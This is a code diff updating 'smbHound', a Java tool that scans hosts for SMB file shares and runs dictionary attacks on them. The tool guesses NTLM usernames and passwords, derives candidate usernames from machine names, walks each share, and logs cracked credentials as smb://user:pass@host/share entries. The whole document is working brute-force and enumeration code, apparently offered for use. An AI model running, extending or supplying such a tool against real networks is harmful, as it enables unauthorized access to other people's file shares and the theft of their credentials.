@@ -18,9 +18,10 @@ public class SmbHound {
 
     public static ArrayList<String> users;
     public static ArrayList<String> passwords;
+    private static ExecutorService pool;
 
     public static void showPic() {
-        System.out.println("smbHound V2.3 by $h@");
+        System.out.println("smbHound V2.4.1 by $h@");
         System.out.println("                      _..._..._");
         System.out.println("                   .-' '::   '::-.");
         System.out.println("                  /    _     _    \\");
@@ -82,13 +83,13 @@ public class SmbHound {
         System.out.println("[ :)] done reading dictionary files");
 
         String prefix = next;
-        ExecutorService pool;
+
         if (args.length > 1) {
             try {
                 int cant = Integer.parseInt(args[1]);
                 pool = Executors.newFixedThreadPool(cant);
-                System.out.println("[ :)] working with "+args[1]+" threads");
-            } catch (Exception e) {
+                System.out.println("[ :)] working with " + args[1] + " threads");
+            } catch (NumberFormatException e) {
                 System.err.println("[ :(] Can't read thread count");
                 pool = Executors.newFixedThreadPool(50);
                 System.out.println("[ :)] working with 50 threads");
@@ -120,7 +121,7 @@ public class SmbHound {
 
         }
 
-        pool.shutdown();
+//        pool.shutdown();
         System.out.println("[ :)] All found smb servers are saved on foundLog.log");
     }
 
@@ -129,7 +130,7 @@ public class SmbHound {
 
         private String ip;
         private boolean onerror;
-        String[] posfixes = {"-pc", "_pc", "-pc1"};
+        String[] posfixes = {"-", "_","--","__"};
 
         public activator(String ip) {
             this.ip = ip;
@@ -137,7 +138,8 @@ public class SmbHound {
         }
 
         public void run() {
-            if ((!active()) && (!this.onerror)) {
+            active();
+            if ((!this.onerror)) {
                 boolean found = false;
                 boolean noname = false;
                 try {
@@ -147,8 +149,15 @@ public class SmbHound {
                     System.out.println(new StringBuilder().append("[^_^] ").append(this.ip).append(" also named ").append(s).append(" detected active but not open. Dictionary test working.").toString());
 
                     for (String i : this.posfixes) {
-                        if (s.endsWith(i)) {
+                        if (s.contains(i)) {
                             usrs.add(s.substring(0, s.lastIndexOf(i)));
+                            break;
+                        }
+                    }
+                    
+                    for (String i : this.posfixes) {
+                        if (s.contains(i)) {
+                            usrs.add(s.substring(s.indexOf(i)+1, s.length()));
                             break;
                         }
                     }
@@ -247,14 +256,28 @@ public class SmbHound {
 
         private boolean active() {
             try {
-                SmbFile f = new SmbFile(new StringBuilder().append("smb://").append(this.ip).toString());
+                SmbFile f = new SmbFile("smb://" + this.ip);
                 f.connect();
-                System.out.println(new StringBuilder().append("[ :D]> smb://").append(this.ip).toString());
+//                System.out.println("[ :D]> smb://" + this.ip);
+//                log("smb://" + this.ip);
+                for (SmbFile i : f.listFiles()) {
+                    try {
+                        if (!i.getName().equals("IPC$/")) {
+                            i.connect();
+                            System.out.println("[ :D]> smb://" + this.ip + "/" + i.getName());
+                            log("smb://" + this.ip + "/" + i.getName());
+                        }
+                    } catch (jcifs.smb.SmbAuthException ex) {
+                        Thread a = new Thread(new activator(this.ip + "/" + i.getName()));
+                        pool.execute(a);
+//                        System.out.println("running activator for "+this.ip + "/" + i.getName());
+                    }
+                }
 
-                log(new StringBuilder().append("smb://").append(this.ip).toString());
                 return true;
             } catch (SmbAuthException aex) {
-            } catch (Exception ex) {
+            } catch (IOException ex) {
+//                System.out.println(ex.getMessage());
                 this.onerror = true;
                 return false;
             }
@@ -264,13 +287,25 @@ public class SmbHound {
 
         private boolean active(String user, String pass) {
             try {
-                SmbFile f = new SmbFile(new StringBuilder().append("smb://").append(this.ip).toString(), new NtlmPasswordAuthentication("", user, pass));
+                SmbFile f = new SmbFile("smb://" + this.ip, new NtlmPasswordAuthentication("", user, pass));
                 f.connect();
-                System.out.println(new StringBuilder().append("[ :D]> ").append(user).append(" <-> ").append(pass).append(" <-> smb://").append(this.ip).toString());
-                log(new StringBuilder().append(user).append(" <-> ").append(pass).append(" <-> smb://").append(this.ip).toString());
+//                System.out.println("[ :D]> " + user + " <-> " + pass + " <-> smb://" + this.ip);
+//                log(user + " <-> " + pass + " <-> smb://" + this.ip);
+
+                for (SmbFile i : f.listFiles()) {
+                    try {
+                        if (!i.getName().equals("IPC$/")) {
+                            i.connect();
+                            System.out.println("[ :D]> smb://"+user+":"+pass+ "@" + this.ip + "/" + i.getName());
+                            log("[ :D]> smb://"+user+":"+pass+ "@" + this.ip + "/" + i.getName());
+                        }
+                    } catch (jcifs.smb.SmbAuthException ex) {
+                    }
+                }
+
                 return true;
             } catch (SmbAuthException aex) {
-            } catch (Exception ex) {
+            } catch (IOException ex) {
                 this.onerror = true;
                 return false;
             }
